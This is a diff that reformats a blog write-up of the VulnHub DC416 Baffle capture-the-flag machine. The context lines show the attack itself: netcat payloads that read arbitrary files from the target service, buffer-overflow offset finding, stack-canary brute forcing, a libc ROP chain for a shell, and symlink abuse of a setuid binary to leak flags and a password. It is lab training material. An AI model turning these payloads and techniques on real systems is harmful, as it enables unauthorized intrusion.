@@ -12,9 +12,9 @@ After I finished [DC416 - Basement](/post/vulnhub_dc416_basement/) I wanted to g
 
 Here are my other writeups for the DC416 challenges:
 
-* [DC416 Basement](/post/vulnhub_dc416_basement/)
-* [DC416 Dick Dastardly](/post/vulnhub_dc416_dick_dastardly/)
-* [DC416 Fortress](/post/vulnhub_dc416_fortress/)
+- [DC416 Basement](/post/vulnhub_dc416_basement/)
+- [DC416 Dick Dastardly](/post/vulnhub_dc416_dick_dastardly/)
+- [DC416 Fortress](/post/vulnhub_dc416_fortress/)
 
 # Information Gathering
 
@@ -65,11 +65,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 # alice
 
 Nmap found a `.git` directory in the webroot with directory listing enabled. This allows us to easily retreive the contents using wget
+
 ```
 wget -r --no-parent http://192.168.56.2/.git/
 ```
 
 Now we are able to operate with git on the directory:
+
 ```
 root@kali:~/baffle# cd 192.168.56.2/
 root@kali:~/baffle/192.168.56.2# git status
@@ -84,6 +86,7 @@ no changes added to commit (use "git add" and/or "git commit -a")
 ```
 
 And here is the commit history:
+
 ```
 root@kali:~/baffle/192.168.56.2# git log
 commit 8bde72465957415c12ab6f89ff679f8f9e7c5c7a
@@ -126,6 +129,7 @@ Date:   Mon Oct 17 14:30:20 2016 -0400
 Viewing the files on every commit by `git checkout HASH` we can extract the following revisions of `hellofriend.c`:
 
 **d7a1f067a2f4ac469bc4cf77c689a34e2286b665**
+
 ```
 #include <stdio.h>
 #include <string.h>
@@ -152,6 +156,7 @@ int main(int argc, char *argv[]) {
 ```
 
 **7edc47a1c3e4dc880a7191915bdbf1565c6b7441**
+
 ```
 #include <stdio.h>
 #include <string.h>
@@ -194,6 +199,7 @@ int main(int argc, char *argv[]) {
 ```
 
 **06483346fab91b2b17471074a887ac7dffd9ceda**
+
 ```
 #include <stdio.h>
 #include <string.h>
@@ -236,6 +242,7 @@ int mAin(int arGc, char *argv[]) {
 ```
 
 **9b5c226d15d611d6957f3fda7c993186270a6cc4**
+
 ```
 #include <stdio.h>
 #include <string.h>
@@ -286,6 +293,7 @@ int main(int argc, char *argv[]) {
 ```
 
 **d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca**
+
 ```
 #include <stdio.h>
 #include <string.h>
@@ -336,6 +344,7 @@ int main(int argc, char *argv[]) {
 ```
 
 **8bde72465957415c12ab6f89ff679f8f9e7c5c7a**
+
 ```
 #include <stdio.h>
 #include <string.h>
@@ -379,6 +388,7 @@ int main(int argc, char *argv[]) {
 By looking at the commit log using `git log -p` we can also see a file called `project.enc` which was deleted in later commits but more on this later.
 
 If we look closely on the file at commit `My cat danced on the keyboard` (`06483346fab91b2b17471074a887ac7dffd9ceda`) we can notice some uppercase letters. If we only extract the uppercase letters we get the following text:
+
 ```
 grep -ohE "[A-Z]" hellofriend.c | tr -d "\n"
 
@@ -386,6 +396,7 @@ FILEFLAGARSEREQUEST
 ```
 
 So this looks like a flag string. Extracting it manually from the file reveals our first flag:
+
 ```
 FLAG{ARSE_REQUEST}
 ```
@@ -402,12 +413,14 @@ root:x:0:0:root:/root:/bin/bash
 ```
 
 As the `fgets` function only reads text up to a newline or EOF (null byte) character we are only able to read the first line of a file. This behaviour is enough to get the contents of `flag.txt`:
+
 ```
 root@kali:~/baffle# python -c 'print("\x01\x01flag.txtaaaaaa")' | nc 192.168.56.2 6969
 FLAG{is_there_an_ivana_tinkle}
 ```
 
 If we look at commit **d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca** we can see an additional file called `project.enc`. The file seems to be base64 encoded so let's decode it and have a look:
+
 ```
 root@kali:~/baffle# git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
 root@kali:~/baffle# cat project.enc | base64 -d > exe
@@ -416,6 +429,7 @@ exe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, in
 ```
 
 So this looks like the compiled code and we can start analyzing it. By looking at the c code (because it's easier to read) we can see our vulnerable code at the bottom:
+
 ```
 memcpy(data, ptr, 2000);
 ```
@@ -423,6 +437,7 @@ memcpy(data, ptr, 2000);
 The `ptr` variable is modified before to cut of the header and then 2000 bytes are written to `data`. This copies way more bytes into `data` as it is able to hold (`char data[500];`).
 
 As we have the binary we can load it in `gdb` and check if there are any protections in place
+
 ```
 gdb-peda$ checksec
 CANARY    : disabled
@@ -433,6 +448,7 @@ RELRO     : disabled
 ```
 
 We can also check the ASLR status with the file read vulnerability:
+
 ```
 root@kali:~/baffle# python -c 'print("\x01\x01/proc/sys/kernel/randomize_va_spaceaaaaaa")' | nc 192.168.56.2 6969
 2
@@ -444,12 +460,13 @@ So the only protection active is ASLR but the executable is compiled without PIE
 
 To exploit the vulnerability we first need to be sure we reach the vulnerable `memcpy`. By looking at the `hellofriend.c` file we can identify the following conditions that must be met:
 
-* request type 0x02 with 2 bytes
-* the `file_len` variable is a `strlen` of the whole input. As the `read` function does not stop at null bytes but the `strlen` does we can simply trick it by adding a null byte.
-* After the null byte we need to add another 6 bytes
-* After the 6 bytes we can plant our malicous code
+- request type 0x02 with 2 bytes
+- the `file_len` variable is a `strlen` of the whole input. As the `read` function does not stop at null bytes but the `strlen` does we can simply trick it by adding a null byte.
+- After the null byte we need to add another 6 bytes
+- After the 6 bytes we can plant our malicous code
 
 First we need to get the exact offset where we are able to control our return so let's create a pattern with a valid header:
+
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 > pattern
 python -c 'print("\x02\x02asdf\x00aaaaaa")' | tr -d "\n" > test.txt
@@ -457,17 +474,20 @@ cat pattern >> test.txt
 ```
 
 Then run it in gdb:
+
 ```
 r < test.txt
 ```
 
 We can see the `ret` instruction would return to `8Ar9As0As1....` so we view the hex representation of the address `rsp` points to:
+
 ```
 gdb-peda$ x/1xg 0x7fffffffdc98
 0x7fffffffdc98:	0x4130734139724138
 ```
 
 We can now get the exact offset with `pattern_offset.rb` which is `536`:
+
 ```
 root@kali:~/baffle# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x4130734139724138
 [*] Exact match at offset 536
@@ -494,6 +514,7 @@ charlie:x:1003:1003:,,,:/home/charlie:/bin/bash
 ```
 
 Code:
+
 ```
 #!/usr/bin/env python2
 
@@ -572,14 +593,14 @@ ln -s /home/bob/filez/flag_vault /home/alice/flag_vault
 
 ```
 $ ./flag_vault
-______ _                _    _   _             _ _   
-|  ___| |            /\| |/\| | | |           | | |  
+______ _                _    _   _             _ _
+|  ___| |            /\| |/\| | | |           | | |
 | |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
 |  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
 | |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
 \_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
-                __/ |                                
-               |___/                                 
+                __/ |
+               |___/
 
 ENTER YOUR AUTHENTICATION CODE: test
 CHECKING CODE... CODE IS VALID
@@ -587,17 +608,18 @@ DATA: FLAG{tr3each3ry_anD_cUnn1ng}
 ```
 
 Using the same trick we can also get the password required by the binary:
+
 ```
 ln -fs /home/bob/filez/auth.txt /home/alice/flag.txt
 $ ./flag_vault
-______ _                _    _   _             _ _   
-|  ___| |            /\| |/\| | | |           | | |  
+______ _                _    _   _             _ _
+|  ___| |            /\| |/\| | | |           | | |
 | |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
 |  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
 | |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
 \_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
-                __/ |                                
-               |___/                                 
+                __/ |
+               |___/
 
 ENTER YOUR AUTHENTICATION CODE: test
 CHECKING CODE... CODE IS VALID
@@ -605,9 +627,11 @@ DATA: we_seek_after_knowledge_and_you_call_us_criminals
 ```
 
 # vulnhub
+
 This one was the hardest challenge on baffle for me.
 
 We can use bob's flag as a password for the user `bob` and ssh into the machine.
+
 ```
 sshpass -p tr3each3ry_anD_cUnn1ng ssh bob@192.168.56.2
 ```
@@ -659,6 +683,7 @@ bob@baffle:~/binz$ ls -al /lib/x86_64-linux-gnu/libc.so.6
 ```
 
 To calculate the offsets we first need to get the location of the `read` and the `system` function.
+
 ```
 root@kali:~/baffle# readelf -s libc-2.19.so | grep read@
    534: 00000000000dbb90    90 FUNC    WEAK   DEFAULT   12 __read@@GLIBC_2.2.5
@@ -679,6 +704,7 @@ So the `read` function is located at offset `0x00000000000dbb90` and `system` at
 As this binary is x64 we can not simply put the arguments for the call to `system` on the stack, instead we need to pass them through registers.
 
 On x64 parameters are passed the following way (a list of system calls on x64 can be found [here](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)):
+
 ```
 function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)
                ^system          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
@@ -692,11 +718,13 @@ We can now create a rop chain to put the desired values in the registers, call s
 To test the exploit locally we need to adjust the offsets as the libc version differs with the one from the VM. Also the networking code of the binary is really crappy as it never releases a socket resulting in `too many open files` error messages when running against the VM. In that case a simple VM reset helps :) But the case that we have to bruteforce the canary on each run and the crappy socket handling makes debugging this binary a pain in the ass - thanks [@superkojiman](https://twitter.com/superkojiman) :D
 
 We can expose the local port on our machine by using a SSH port forward and executing the script again - this should get us a shell:
+
 ```
 sshpass -p tr3each3ry_anD_cUnn1ng ssh -L 7979:localhost:7979 bob@192.168.56.2
 ```
 
 Final output of the exploit:
+
 ```
 root@kali:~/baffle# ./ctfingerd.py
 [+] Found part 1/8 of stack canary: 0x0
@@ -759,7 +787,7 @@ cat .my_loot/flag.txt
                  .-"-.
                 / 4 4 \
                 \_ v _/
-                //   \\      
+                //   \\
                ((     ))
          =======""===""=======
                   |||
@@ -769,6 +797,7 @@ cat .my_loot/flag.txt
 ```
 
 Code:
+
 ```
 #!/usr/bin/env python2
 
@@ -999,10 +1028,10 @@ cat flag.txt
 FLAG{i_haz_sriracha_ice_cream}
 ```
 
-
 Finally all 5 flags after a lot of fun hours exploiting the binaries :)
 
 All 5 flags:
+
 ```
 FLAG{ARSE_REQUEST}
 FLAG{is_there_an_ivana_tinkle}
